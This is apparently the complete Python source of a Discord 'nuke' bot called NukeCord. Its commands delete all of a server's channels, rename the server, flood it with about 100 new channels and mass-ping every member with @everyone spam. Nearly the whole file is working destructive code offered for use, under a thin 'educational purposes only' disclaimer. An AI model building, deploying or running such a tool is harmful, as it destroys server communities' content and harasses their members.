print("[!] Don't forget to fill out the information in config.json")
print("[~] Do nc!duck to get all commands")
import discord 
from discord.ext import commands
import json, os
bot = commands.Bot(command_prefix="nc!")
bot.remove_command("help")
f = open("config.json", "r")
x = f.read()
y = json.loads(x)
TOKEN = y["token"]
O = y["your_id"]
ID = int(O)


@bot.event 
async def on_ready():
    print(f"[!] Logged in as {bot.user}")


@bot.command()
async def duck(ctx):
    if ctx.author.id == ID:
        embed = discord.Embed(title="This bot is running NukeCord", description="This is made for educational purposes only! Do never nuke servers of innocent people!\n__**Available commands:**__\n```\nnc!nuke <text>\nnc!spam <text>\n```", color=0x36393e)
        embed.set_thumbnail(url="https://i.vgy.me/8LslSF.png")
        await ctx.send(embed=embed)




@bot.command()
@commands.guild_only()
async def nuke(ctx, *, arg):
    if ctx.author.id == ID:
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except:
                print(f"""[!] Could not delete channel "{channel.name}" """)
        await ctx.guild.edit(name=arg)
        x = 100
        while x >= 0:
            await ctx.guild.create_text_channel(arg)
            x = int(x) -1

@bot.command()
@commands.guild_only()
async def spam(ctx, *, arg):
    if ctx.author.id == ID:
        for channel in ctx.guild.channels:
            if type(channel) != discord.channel.TextChannel:
                print("\n")
            else:
                await channel.send(f"{arg} @everyone")
            


bot.run(TOKEN)
